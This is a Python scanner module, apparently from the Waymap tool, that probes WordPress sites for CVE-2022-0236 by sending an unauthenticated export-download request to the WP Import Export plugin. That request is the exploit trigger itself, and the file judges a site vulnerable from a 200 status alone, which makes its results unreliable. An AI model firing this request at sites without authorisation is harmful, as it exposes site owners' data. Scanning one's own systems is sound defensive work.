# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-0236 - WordPress WP Import Export Plugin - Unauthenticated Sensitive Data Disclosure

import requests
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

data = {'wpie_download_export_id': '1'}

def check_vulnerability(target):

    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {target} for vulnerability...")

        response = requests.post(f'{target}/wp-admin/admin.php?page=wpie-new-export', data=data, verify=False)

        if response.status_code == 200:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {target} is vulnerable to unauthenticated sensitive data disclosure.")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[-] {target} is not vulnerable.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[-] An error occurred: {e}")

def scan_cve_2022_0236(target):

    check_vulnerability(target)
